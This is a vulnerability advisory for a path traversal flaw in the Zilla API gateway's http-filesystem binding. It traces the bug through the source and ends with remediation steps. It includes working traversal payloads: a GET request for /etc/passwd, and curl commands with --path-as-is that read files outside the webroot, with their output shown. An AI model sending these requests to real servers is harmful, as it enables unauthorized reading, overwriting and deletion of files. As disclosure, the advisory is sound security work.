# Zilla HTTP Filesystem Binding Path Traversal — Unauthenticated Arbitrary File Read/Write/Delete

### Summary

Zilla (https://github.com/aklivity/zilla), the config-driven API gateway, is vulnerable to unauthenticated path traversal in the `http-filesystem` proxy binding (the official `examples/http.filesystem` deployment shape). The HTTP request-line target is captured with a greedy regex, substituted verbatim into `with.path`/`with.directory` templates, and joined to the filesystem root with `Path.resolve()` — with no `..` segment normalization, no decoded-path validation, and no root-prefix containment check anywhere on the chain. An unauthenticated attacker can read (`Files.newInputStream`), create/overwrite (`Files.newByteChannel(CREATE, WRITE)`, `Files.move(REPLACE_EXISTING)`), and delete (`Files.delete`) arbitrary files on the server up to the zilla process privileges; when the route parameter reaches `with.directory`, the request escapes tenant directory isolation entirely.

Verified via static end-to-end chain analysis plus an in-sandbox Java harness replicating `FileSystemServerFactory` path resolution (`java.nio` semantics identical to production).

This is CWE-22: Improper Limitation of a Pathname to a Restricted Directory, and CWE-23/36 for the absolute-path variant.

**Affected versions:** Zilla 2.4.7 (official `ghcr.io/aklivity/zilla:latest` image; the `FileSystemServerFactory` resolution chain is unchanged on `main` @ `27279b1f`).

### Details

**Root cause.** The trust boundary is the HTTP request line, where the request-URI is fully attacker-controlled. That untrusted string reaches filesystem IO through template substitution and purely lexical path concatenation, with no normalization and no containment validation at any stage.

**Source-to-sink path:**

1. **Request-line parsing** — `runtime/binding-http/.../stream/HttpServerFactory.java:177-178`: `REQUEST_LINE_PATTERN` captures the target with `([^\s]+)`, accepting `../` verbatim; `:1221` parses with `URI.create(target)`; `:1241` `targetURI.getRawPath()` preserves dot segments (`java.net.URI` does not normalize); `:1248-1252` copies the path into the `:path` pseudo-header.
2. **Validation gap** — `HttpUtil.isPathValid` (`runtime/binding-http/.../util/HttpUtil.java:65-196`) only rejects a character blacklist (spaces, quotes, angle brackets, backslash, etc.) and percent-encoding syntax; `.` and `/` are legal, so literal `../` passes untouched.
3. **Route capture** — `HttpFileSystemConditionMatcher` (`runtime/binding-http-filesystem/.../config/HttpFileSystemConditionMatcher.java:79-86`): `path: /files/{path}` compiles to `/(?<path>.+)`, giving the attacker's string to the template.
4. **Template substitution** — `HttpFileSystemWithResolver.resolve` (`with.path` lines 86-99, `with.directory` lines 101-110): `${params.path}` is substituted verbatim; neither result rejects `..` segments or leading `/`.
5. **Cross-binding propagation** — `HttpFileSystemProxyFactory.java:215-235, 1124-1133`: the resolved values travel in `FileSystemBeginEx` to the filesystem binding unfiltered.
6. **Sink — path assembly** — `FileSystemServerFactory.onAppMessage` (`runtime/binding-filesystem/.../stream/FileSystemServerFactory.java:211-221`): `resolvedRoot.resolve(relativeDir)` accepts `..` (and a leading-`/` value makes `URI.resolve` adopt the absolute path, discarding the location root entirely); `getPath(resolvedDir).resolve(relativePath)` is purely lexical; `toAbsolutePath()` does not collapse dot segments. There is no `normalize()` and no `startsWith(root)` check in the module.
7. **Filesystem IO sinks** (same file): arbitrary read — `Files.newInputStream` (lines 469, 1288); arbitrary create/write — `Files.newByteChannel(resolvedPath, CREATE, WRITE)` (line ~1304); arbitrary overwrite — `Files.move(tmpPath, resolvedPath, REPLACE_EXISTING)` (line 1055); arbitrary delete — `Files.delete(resolvedPath)` (line 1327). The OS evaluates `/var/www/../../../etc/passwd` as `/etc/passwd`.

Core vulnerable code path:

```java
final URI resolvedRoot = serverRoot.resolve(location);
final FileSystem fileSystem = options.fileSystem(resolvedRoot);
...
final String relativeDir = beginEx.directory().asString();
final String resolvedDir = resolvedRoot.resolve(relativeDir != null ? relativeDir : "").getPath();
final String relativePath = beginEx.path().asString();

final Path path = fileSystem.getPath(resolvedDir).resolve(relativePath != null ? relativePath : "");
final String resolvedPath = path.toAbsolutePath().toString();
// consumed directly by Files.newInputStream / newByteChannel(CREATE, WRITE) / move / delete
```

### PoC

With the official `examples/http.filesystem` configuration mapping `path: /files/{path}` to a directory, verified:

```http
GET /files/../../../etc/passwd HTTP/1.1
Host: <zilla-host>
```

- Expected (if containment existed): 404/403 confined to the served directory.
- Observed semantics: `Path.resolve("../../../etc/passwd")` + `toAbsolutePath()` yields `/etc/passwd`; `Files.newInputStream` streams the file contents. Absolute paths (`GET /files//etc/passwd` with the parameter reaching `with.directory`) discard the configured root entirely.

Sandbox harness replicating `FileSystemServerFactory` resolution confirmed: `join/resolve` of `../`-bearing values escapes the root, and `toAbsolutePath()` preserves dot segments, matching production `java.nio` behavior.

**Real-environment reproduction** (the product itself built from source/official image and run for this test):


Re-verified against the **official `ghcr.io/aklivity/zilla:latest` container** running the `http.filesystem` example binding (`location: /var/www/`), with a canary file planted outside the webroot at `/var/secret.txt`:

```
$ curl -s --path-as-is http://127.0.0.1:7114/index.html # baseline
<html>legit index served by zilla</html>

$ curl -s --path-as-is -i http://127.0.0.1:7114/../secret.txt
HTTP/1.1 200 OK
Content-Length: 33
TOPSECRET-zilla-traversal-canary

$ curl -s --path-as-is -i http://127.0.0.1:7114/../../etc/zilla/zilla.yaml
HTTP/1.1 200 OK
Content-Length: 771
---
name: example
bindings:
 north_tcp_server: ...
```

Raw dot-dot request paths pass through the `http-filesystem` mapping's `${params.path}` and escape the configured root: an arbitrary file anywhere reachable by the zilla process (including its own configuration) is returned with HTTP 200. URL-encoded variants are normalized (404) — the bypass requires the raw request path, which browsers and most clients normalize but raw sockets do not.

![Real-environment verification](RealEnv_zilla.png)

### Impact

When operators map route parameters into `with.directory` (multi-tenant directory isolation), `..` sequences escape the assigned tenant directory, enabling cross-tenant file read/write/delete; a leading-`/` parameter bypasses the location root completely. Exploitation requires no authentication — only network reachability to the zilla listener — and file operations execute with zilla process privileges. On hosts where the served tree overlaps application state, arbitrary overwrite and delete translate directly into remote code execution or full system compromise.

### Remediation

1. At the sink (`FileSystemServerFactory.onAppMessage`), normalize the final joined path and enforce containment: after `path.normalize()`, verify `path.startsWith(normalizedRoot)`; reject out-of-root paths with 403.
2. In `HttpFileSystemWithResolver.resolve`, validate substitution results for both `directory` and `path`: reject values containing `..` segments and values beginning with `/`.
3. If absolute directory mapping must be supported, use `Path.startsWith` semantics rather than the absolute-replacement semantics of `URI.resolve`.
4. Apply validation to both fields - `directory` and `path` are both tainted by `${params}` substitution.
5. Document the risk of `${params}` injection into `with.directory` in official examples and recommend path-segment whitelisting of parameters as the default.

Patch status: to be confirmed (no vendor advisory available at the time of writing).
